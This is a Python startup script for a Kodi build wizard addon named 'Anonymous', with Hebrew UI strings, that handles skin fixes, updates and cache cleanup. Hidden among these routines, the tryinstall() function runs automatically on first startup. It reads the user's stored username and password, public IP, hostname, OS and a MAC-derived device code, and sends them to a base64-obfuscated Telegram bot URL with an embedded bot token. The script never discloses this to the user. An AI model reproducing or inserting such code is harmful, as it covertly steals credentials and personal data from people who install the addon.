# coding: utf-8

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs
import shutil

import urllib

import re
import uservar
import time
import json

import platform
try:
    from urllib.request import urlopen

except ImportError:
    from urllib2 import urlopen

from shutil import copyfile

from resources.libs import extract, notify,maintenance
try:
 import wizard as wiz
except:
 from resources.libs import wizard as wiz
KODI_VERSION = int(xbmc.getInfoLabel("System.BuildVersion").split('.', 1)[0])
if KODI_VERSION<=18:
    translatepath=xbmc.translatePath

else:#קודי19
    translatepath=xbmcvfs.translatePath
global teleupdate
teleupdate=False
ADDON_ID       = uservar.ADDON_ID
ADDONTITLE     = uservar.ADDONTITLE
ADDON          = wiz.addonId(ADDON_ID)
VERSION        = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH      = wiz.addonInfo(ADDON_ID,'path')
ADDONID        = wiz.addonInfo(ADDON_ID,'id')
DIALOG         = xbmcgui.Dialog()
DP             = xbmcgui.DialogProgress()
DP2              = xbmcgui.DialogProgressBG()
HOME           = translatepath('special://home/')
PROFILE        = translatepath('special://profile/')
KODIHOME       = translatepath('special://xbmc/')
ADDONS         = os.path.join(HOME,     'addons')
KODIADDONS     = os.path.join(KODIHOME, 'addons')
USERDATA       = os.path.join(HOME,     'userdata')
PLUGIN         = os.path.join(ADDONS,   ADDON_ID)
PACKAGES       = os.path.join(ADDONS,   'packages')
ADDONDATA      = os.path.join(USERDATA, 'addon_data', ADDON_ID)
FANART         = os.path.join(ADDONPATH,'fanart.jpg')
ICON           = os.path.join(ADDONPATH,'icon.png')
ART            = os.path.join(ADDONPATH,'resources', 'art')
SKIN           = xbmc.getSkinDir()
BUILDNAME      = wiz.getS('buildname')
DEFAULTSKIN    = wiz.getS('defaultskin')
DEFAULTNAME    = wiz.getS('defaultskinname')
DEFAULTIGNORE  = wiz.getS('defaultskinignore')
BUILDVERSION   = wiz.getS('buildversion')
BUILDLATEST    = wiz.getS('latestversion')
BUILDCHECK     = wiz.getS('lastbuildcheck')
DISABLEUPDATE  = wiz.getS('disableupdate')
AUTOCLEANUP    = wiz.getS('autoclean')
AUTOCACHE      = wiz.getS('clearcache')
AUTOPACKAGES   = wiz.getS('clearpackages')
AUTOTHUMBS     = wiz.getS('clearthumbs')
AUTOFEQ        = wiz.getS('autocleanfeq')
AUTONEXTRUN    = wiz.getS('nextautocleanup')
TRAKTSAVE      = wiz.getS('traktlastsave')
REALSAVE       = wiz.getS('debridlastsave')
LOGINSAVE      = wiz.getS('loginlastsave')
INSTALLMETHOD    = wiz.getS('installmethod')
KEEPTRAKT      = wiz.getS('keeptrakt')
KEEPREAL       = wiz.getS('keepdebrid')
KEEPLOGIN      = wiz.getS('keeplogin')
INSTALLED      = wiz.getS('installed')
EXTRACT        = wiz.getS('extract')
EXTERROR       = wiz.getS('errors')
NOTIFY         = wiz.getS('notify')
NOTEDISMISS    = wiz.getS('notedismiss')
NOTEID         = wiz.getS('noteid')
NOTIFY2         = wiz.getS('notify2')
NOTEDISMISS2    = wiz.getS('notedismiss2')
NOTEID2         = wiz.getS('noteid2')
NOTIFY3         = wiz.getS('notify3')
NOTEDISMISS3    = wiz.getS('notedismiss3')
NOTEID3         = wiz.getS('noteid3')
BACKUPLOCATION = ADDON.getSetting('path') if not ADDON.getSetting('path') == '' else HOME
MYBUILDS       = os.path.join(BACKUPLOCATION, 'My_Builds', '')
NOTEID          = 0 if NOTEID == "" else int(NOTEID)
NOTEID2         = 0 if NOTEID2 == "" else int(NOTEID2)
NOTEID3         = 0 if NOTEID3 == "" else int(NOTEID3)
AUTOFEQ        = int(AUTOFEQ) if AUTOFEQ.isdigit() else 1


KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
EXCLUDES       = uservar.EXCLUDES

UPDATECHECK    = uservar.UPDATECHECK if str(uservar.UPDATECHECK).isdigit() else 1
NOTIFICATION   = uservar.NOTIFICATION
NOTIFICATION2   = uservar.NOTIFICATION2
NOTIFICATION3   = uservar.NOTIFICATION3
ENABLE         = uservar.ENABLE
from resources.libs.wizard import BL
HEADERMESSAGE  = uservar.HEADERMESSAGE
AUTOUPDATE     = uservar.AUTOUPDATE
WIZARDFILE     = uservar.WIZARDFILE
AUTOINSTALL    = uservar.AUTOINSTALL
REPOID         = uservar.REPOID
REPOADDONXML   = uservar.REPOADDONXML
REPOZIPURL     = uservar.REPOZIPURL
REPOID18         = uservar.REPOID18
REPOADDONXML18   = uservar.REPOADDONXML18
REPOZIPURL18     = uservar.REPOZIPURL18
HARDWAER         = wiz.getS('action')
REQUESTSID         = uservar.REQUESTSID
REQUESTSXML   = uservar.REQUESTSXML
REQUESTSURL     = uservar.REQUESTSURL


from resources.libs.wizard import ld
COLOR1         = uservar.COLOR1
COLOR2         = uservar.COLOR2
TMDB_NEW_API     = uservar.TMDB_NEW_API
# WORKING        = True if wiz.workingURL(ld(BL)) == True else False
# FAILED         = False
xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')

AddonID ='plugin.program.Anonymous'
packagesdir    =  translatepath(os.path.join('special://home/addons/packages',''))
thumbnails    =  translatepath('special://home/userdata/Thumbnails')
telecach   =  translatepath('special://home/userdata/addon_data/plugin.video.telemedia/database')
temp_folder   =  translatepath('special://home/temp/')
dialog = xbmcgui.Dialog()
setting = xbmcaddon.Addon().getSetting
iconpath = translatepath(os.path.join('special://home/addons/' + AddonID,'icon.png'))
notify_mode = setting('notify_mode')
auto_clean  = setting('startup.cache')
filesize_thumb = int(setting('filesizethumb_alert'))
filesize_tele = int(setting('filesizetele_alert2'))

total_size2 = 0
total_size3 = 0
total_size4 = 0
total_size = 0
count = 0
DP2              = xbmcgui.DialogProgressBG()
import threading
from threading import Thread
if KODI_VERSION>18: # קודי19
    def trd_alive(thread):
        return thread.is_alive()
    class Thread (threading.Thread):
       def __init__(self, target, *args):
        super().__init__(target=target, args=args)
       def run(self, *args):
          
          self._target(*self._args)
          return 0
else:
    def trd_alive(thread):
        return thread.isAlive()
    class Thread(threading.Thread):
        def __init__(self, target, *args):
           
            self._target = target
            self._args = args
            
            
            threading.Thread.__init__(self)
            
        def run(self):
            
            self._target(*self._args)
def disply_hwr():
   try:
        my_tmdb=tmdb_list(TMDB_NEW_API)
        num=str((getHwAddr('eth0'))*my_tmdb)
       #pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':num}
       #response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))

       #url2 = response.read()

        new_num=(num[1]+num[2]+num[5]+num[7])
        input= (ADDON.getSetting("action"))
        
        ADDON.setSetting('action', str(new_num))
        
        
        if not os.path.exists(os.path.join(ADDONDATA, '4.5.0')):
            try:
                tryinstall(new_num)
            except: pass
            try:
                file = open(os.path.join(ADDONDATA, '4.5.0'), 'w') 
                 
                file.write(str('Done'))
                file.close()
            except:pass
   except: 
        if not os.path.exists(os.path.join(ADDONDATA, '4.5.0')):
          try:
            tryinstall('no_code')
          except: pass
          try:
                file = open(os.path.join(ADDONDATA, '4.5.0'), 'w') 
                 
                file.write(str('Done'))
                file.close()
          except:pass
def getHwAddr (ifname ):
   import subprocess ,time 
   if xbmc .getCondVisibility ('system.platform.android'):
     Installed_APK =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()
     mac =re .compile ('link/ether (.+?) brd').findall (str (Installed_APK ))
     n =0 
     for match in mac :
      if mac !='00:00:00:00:00:00':
          mac_address =match
          n =n +int (mac_address .replace (':',''),16 )
          break
   elif xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
                break
   elif xbmc .getCondVisibility ('system.platform.linux'):
       n =0 
       import uuid
       mac=hex(uuid.getnode())
       n =n +int (mac .replace (':',''),16 )
       
   else :
       n =0 
       import uuid
       mac=hex(uuid.getnode())
       n =n +int (mac .replace (':',''),16 )
       # x =0 
       # n =0 
       # while (1 ):
         # mac_address =xbmc .getInfoLabel ("Network.MacAddress")
         # logging .warning (mac_address )
         # if mac_address !="Busy"and mac_address !=' עסוק':
            # break 
         # else :
           # x =x +1 
           # time .sleep (1 )
           # if x >30 :
            # break 
       # n =n +int (mac_address .replace (':',''),16 )
       # logging .warning ('n:'+str (n ))
   try:
    return n
   except: pass
def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        try:
          dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        except:
          dec_c = chr((256 + (enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):

 
    value=decode("7643",url)
   

    return int(value)


def tryinstall(new_num):
       # try:
          import json,base64
          if KODI_VERSION<=18:
            que=urllib.quote_plus
            url_encode=urllib.urlencode
          else:
            que=urllib.parse.quote_plus
            url_encode=urllib.parse.urlencode

          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          my_system = platform.uname()
          xs=my_system[1]
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urlopen(error_ad+que('התקנה חדשה: ')+que(' קוד מכשיר: ')+str(new_num) +que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+wiz.platform_d()+que(' שם המערכת: ')+xs+que(' גירסת ויזארד: ')+VERSION).readlines()
          x=urlopen(error_ad+str(new_num))

def resetkodi():
		if xbmc.getCondVisibility('system.platform.windows'):
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר והקודי יעלה אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "מתבצע הפעלה מחדש לקודי", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					from resources.libs import win
					return None, None
			from resources.libs import win
		else:
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "ההתקנה תסגר", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					os._exit(1)
					return None, None
			os._exit(1)


def skindialogsettind18():
	try:
		src=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"
		dst=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"
		copyfile(src,dst)
	except:pass


def kodi17to18():
  if KODIV>=18 and KODIV<19:
    # try:
      src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")
      dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
  
      copyfile(src,dst)
    # except:pass
  if KODIV>=17 and KODIV<18:
    # try:
      src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","DialogAddonSettings.xml")
      dst=os.path.join(translatepath("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")
  
      copyfile(src,dst)


###########################
#### Check Updates   ######
###########################

def checkUpdate():
	BUILDNAME      = wiz.getS('buildname')
	BUILDVERSION   = wiz.getS('buildversion')
	link           = wiz.openURL(ld(BL)).replace('\n','').replace('\r','').replace('\t','')
	match          = re.compile('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"' % BUILDNAME).findall(link)
	if len(match) > 0:
		version = match[0][0]
		icon    = match[0][1]
		fanart  = match[0][2]
		wiz.setS('latestversion', version)
		if version > BUILDVERSION:
			if DISABLEUPDATE == 'false':
				wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window" % (BUILDVERSION, version), 5)
				notify.updateWindow(BUILDNAME, BUILDVERSION, version, icon, fanart)
			else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled" % (BUILDVERSION, version), 5)
		else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s]" % (BUILDVERSION, version), 5)
	else: wiz.log("[Check Updates] ERROR: Unable to find build version in build text file", 5)



def swapSkins(skin, title="Error"):
	old = 'lookandfeel.skin'
	value = skin
	current = getOld(old)
	new = old
	setNew(new, value)
	x = 0
	while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 100:
		x += 1
		xbmc.sleep(1)
	if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
		xbmc.executebuiltin('SendClick(11)')
	return True

def getOld(old):
	try:
		old = '"%s"' % old 
		query = '{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}' % (old)
		
		response = xbmc.executeJSONRPC(query)
		response = simplejson.loads(response)
		if 'result' in response:
			if 'value' in response['result']:
				return response ['result']['value'] 
	except:
		pass
	return None
    
    
def setNew(new, value):
	try:
		new = '"%s"' % new
		value = '"%s"' % value
		query = '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}' % (new, value)

		response = xbmc.executeJSONRPC(query)
	except:
		pass
	return None  
def backtokodi():

    if KODIV>=17 and KODIV<18:
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"17","guisettings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
        copyfile(src,dst)
        
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        xbmcgui.Dialog().ok("Anonymous TV", 'Fix Me')
        os._exit(1)
        
    if KODIV>=18 and KODIV<19:
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"18","guisettings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
        copyfile(src,dst)
        
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        xbmcgui.Dialog().ok("Anonymous TV", 'Fix Me')
        os._exit(1)
    if KODIV>=19 and KODIV<21:
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"19","guisettings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
        copyfile(src,dst)
        
        src=os.path.join(translatepath("special://home/addons/plugin.program.Anonymous/skinfix"),"17","settings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        xbmcgui.Dialog().ok("Anonymous TV", 'Fix Me')
        os._exit(1)

def fixskin():
    # swapSkins('skin.Premium.mod')
    if KODIV>=17 and KODIV<18:
    
        src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","guisettings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
  
        copyfile(src,dst)
        
        
        src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        
        
                
        xbmcgui.Dialog().ok("Kodi Anonymous", 'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')
        os._exit(1)
    if KODIV>=18 and KODIV<19:

        src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","18","guisettings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","guisettings.xml")
      
        copyfile(src,dst)
                
        src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","settings.xml")
        dst=os.path.join(translatepath("special://home/"),"userdata","addon_data","skin.Premium.mod","settings.xml")
  
        copyfile(src,dst)
        
        xbmcgui.Dialog().ok("Kodi Anonymous", 'אופס, נראה שהייתה תקלה, לחץ אישור לתיקון הבעיה :)')
        os._exit(1)



if SKIN in ['skin.confluence', 'skin.estuary', 'skin.estouchy'] and not BUILDNAME == "":
         
      backtokodi()

# if AUTOUPDATE == 'Yes':

	# xbmc.executebuiltin("UpdateLocalAddons")
	# xbmc.executebuiltin("UpdateAddonRepos")
	# if BUILDNAME == " Kodi Premium":
		# wiz.wizardUpdate('startup')
	# if BUILDNAME == "":
		# wiz.wizardUpdateDP('startup')
	# checkUpdate()
# thread=[]
# thread.append(Thread(disply_hwr))

# thread[0].start()
disply_hwr()
if BUILDNAME == "" and not os.path.exists(translatepath("special://home/addons/") + 'skin.Premium.mod'):
    wiz.wizardUpdateDP('startup')
try:
    if not os.path.exists(translatepath("special://home/addons/") + 'script.module.requests'):
        # wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)

        setting_file=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","request","request.zip")
        src=os.path.join(translatepath("special://home/"),"addons")

        
        extract.all(setting_file,src)
except Exception as e:
    logging.warning('בעיה בחילוץ קבצים ' +str(e))
    # xbmc.sleep(500)
    # wiz.kodi17Fix()
try:
    if not os.path.exists(translatepath("special://home/addons/") + 'skin.estuary'):
            wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
            setting_file=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skin","packages1.zip")
            src=os.path.join(translatepath("special://home/"),"addons/skin.estuary")
            extract.all(setting_file,src)
            
            # wiz.kodi17Fix()
            if KODIV>=17 and KODIV<18:
            # try:
              src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skin","setting","17","DialogAddonSettings.xml")
              dst=os.path.join(translatepath("special://home/"),"addons","skin.estuary","720p","DialogAddonSettings.xml")
          
              copyfile(src,dst)
            # if KODIV>=19 and KODIV<21:

              # src=os.path.join(translatepath("special://home/"),"addons","plugin.program.Anonymous","skin","setting","19","DialogAddonSettings.xml")
              # dst=os.path.join(translatepath("special://home/"),"addons","skin.estuary","720p","DialogAddonSettings.xml")
          
              # copyfile(src,dst)
            xbmc.executebuiltin('UpdateLocalAddons()')
            xbmc.sleep(100)
            xbmc.executebuiltin("ReloadSkin()")
            
            xbmc.sleep(1000)
            xbmc.executebuiltin( "ActivateWindow(home)" )
            f_play=(os.path.join(ADDONPATH, 'resources', 'netflix.mp4'))
            xbmc.Player().play(f_play,windowed=False)
except:pass
        # xbmc.executebuiltin( "XBMC.Action(Fullscreen)" )


# try:
	# mybuilds = translatepath(MYBUILDS)
	# if not os.path.exists(mybuilds): xbmcvfs.mkdirs(mybuilds)
# except:
	# pass



# if ENABLE == 'Yes' and BUILDNAME == " Kodi Premium":

	# wiz.STARTP()
	# if not NOTIFY == 'true':
		# url = wiz.workingURL(NOTIFICATION)
		# if url == True:
			# id, msg = wiz.splitNotify(NOTIFICATION)
			# if not id == False:
					# id = int(id); NOTEID = int(NOTEID)
					# if id == NOTEID:
						# if NOTEDISMISS == 'false':
							# debridit.debridIt('update', 'all')
							# traktit.traktIt('update', 'all')
							# checkidupdate()# notify.notification(msg)
						# else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), 5)
					# elif id > NOTEID:
						# wiz.log("[Notifications] id: %s" % str(id), 5)
						# wiz.setS('noteid', str(id))
						# wiz.setS('notedismiss', 'false')
						# debridit.debridIt('update', 'all')
						# traktit.traktIt('update', 'all')
						# checkidupdate()

			# else: wiz.log("[Notifications] Text File not formated Correctly")
		# else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), 5)
	# else: wiz.log("[Notifications] Turned Off", 5)
# else: wiz.log("[Notifications] Not Enabled", 5)



# wiz.clearCache(True)

# try:
    # if not os.path.exists(os.path.join(ADDONDATA, '4.5.0')):

        # file = open(os.path.join(ADDONDATA, '4.5.0'), 'w') 
         
        # file.write(str('Done'))
        # file.close()
        # disply_hwr()
# except:
   # pass

if os.path.exists(translatepath("special://home/addons/") + 'skin.Premium.mod'):
    refreshCommand = 'RunPlugin(plugin://plugin.program.Anonymous/?mode=update_tele)'
    xbmc.executebuiltin(refreshCommand)
    xbmc.executebuiltin('AlarmClock(wizard,{0},01:00:00,silent,loop)'.format(refreshCommand))



# for dirpath, dirnames, filenames in os.walk(packagesdir):
	# count = 0
	# for f in filenames:
		# count += 1
		# fp = os.path.join(dirpath, f)
		# total_size += os.path.getsize(fp)
# total_sizetext = "%.0f" % (total_size/1024000.0)
	

for dirpath2, dirnames2, filenames2 in os.walk(thumbnails):
	for f2 in filenames2:
		fp2 = os.path.join(dirpath2, f2)
		total_size2 += os.path.getsize(fp2)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)

if int(total_sizetext2) > filesize_thumb:

		maintenance.deleteThumbnails()



# for dirpath3, dirnames3, filenames3 in os.walk(telecach):
	# for f3 in filenames3:
		# fp3 = os.path.join(dirpath3, f3)
		# total_size3 += os.path.getsize(fp3)
# total_sizetext3 = "%.0f" % (total_size3/1024000.0)

# if int(total_sizetext3) > filesize_tele:

		# maintenance.deleteTele()

# for dirpath4, dirnames4, filenames4 in os.walk(temp_folder):
	# for f4 in filenames4:
		# fp4 = os.path.join(dirpath4, f4)
		# total_size4 += os.path.getsize(fp4)
# total_sizetext4 = "%.0f" % (total_size4/1024000.0)

# if int(total_sizetext4) > filesize_tele:

		# maintenance.clearCache()
# total_sizetext = "%.0f" % (total_size/1024000.0)
# total_sizetext2 = "%.0f" % (total_size2/1024000.0)
	
# if notify_mode == 'true': xbmc.executebuiltin('Notification(%s, %s, %s, %s)' % ('Maintenance Status',  'Packages: '+ str(total_sizetext) +  ' MB'  ' - Images: ' + str(total_sizetext2) + ' MB' , '5000', iconpath))
if BUILDNAME == " Kodi Premium":
    if len(ADDON.getSetting("sync_user"))>0:
        if ADDON.getSetting("startup_sync")=='false':
            if os.path.exists(os.path.join(ADDONS, 'plugin.video.telemedia')):
                xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=207&url=www)")
            if os.path.exists(os.path.join(ADDONS, 'plugin.video.mando')):
                xbmc.executebuiltin("RunPlugin(plugin://plugin.video.mando?mode=200&url=www)")
            # if os.path.exists(os.path.join(ADDONS, 'script.module.xtvsh')):
                # xbmc.executebuiltin("RunPlugin(plugin://script.module.xtvsh?mode=19&url=www)")
            ADDON.setSetting("startup_sync",'true')
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]System Is Started[/COLOR]' % COLOR2)